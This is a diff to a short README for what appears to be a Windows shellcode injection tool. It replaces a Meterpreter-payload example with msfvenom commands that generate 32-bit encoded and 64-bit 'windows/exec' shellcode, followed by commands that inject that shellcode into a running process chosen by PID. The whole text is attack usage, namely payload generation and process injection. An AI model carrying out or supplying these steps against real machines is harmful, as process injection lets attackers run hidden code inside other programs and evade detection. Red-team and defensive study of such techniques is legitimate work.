@@ -1,10 +1,15 @@
 ## Windows
 
-Currently supports only 32bit processes. But it is not a big problem, you can spawn 32bit process on 64bit system:
+### 32bit
 
 `\windows\syswow64\cmd.exe`
 
-`tasklist | findstr cmd.exe`
+`msfvenom -p windows/exec CMD="c:\path\to\prog.exe arg arg" EXITFUNC=thread -e x86/alpha_mixed -f raw -o exec.txt`
 
-`shellcode_inject.exe PID meter.bin`
+`shellcode_inject.exe PID32 exec.txt`
 
+### 64bit
+
+`msfvenom -p windows/x64/exec CMD="c:\path\to\prog.exe arg arg" EXITFUNC=thread -f raw -o exec.bin`
+
+`shellcode_inject64.exe PID64 exec.bin`
